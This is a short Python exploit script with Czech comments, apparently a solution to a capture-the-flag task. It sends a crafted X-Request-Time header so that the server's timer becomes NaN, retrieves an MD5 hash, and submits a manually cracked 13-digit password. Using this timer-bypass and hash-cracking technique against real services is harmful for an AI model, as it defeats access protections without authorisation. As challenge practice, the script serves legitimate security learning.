import requests

# ZMĚŇTE PODLE ZÁLOŽKY "PŘIPOJENÍ" V ÚLOZE
IP_ADRESA = "51.21.149.235"
PORT = "XXXXX"  # Sem doplňte port ze záložky Připojení
TARGET_URL = f"http://{IP_ADRESA}:{PORT}"


def exploit():
    # Hlavička, která způsobí, že downloadTimestamp bude NaN
    headers = {"X-Request-Time": "vlastni-hodnota"}

    print(f"[*] Připojování k {TARGET_URL}...")
    try:
        # Získání hashe
        res_hash = requests.get(f"{TARGET_URL}/getHash", headers=headers)
        res_hash.raise_for_status()
        target_md5 = res_hash.text.strip()
        print(f"[+] Získán MD5 hash: {target_md5}")
        print("[!] Časovač na serveru je nyní vyřazen (nastaven na NaN).")

        # Teď musíte hash prolomit (viz krok 3 níže)
        print("-" * 40)
        password = input("Zadejte prolomené heslo (13 číslic): ").strip()

        # Odeslání řešení
        print("[*] Odesílám řešení...")
        res_sol = requests.post(f"{TARGET_URL}/solution", json={"password": password})
        print(f"[+] Odpověď serveru: {res_sol.text}")

    except Exception as e:
        print(f"[CHYBA] {e}")


if __name__ == "__main__":
    exploit()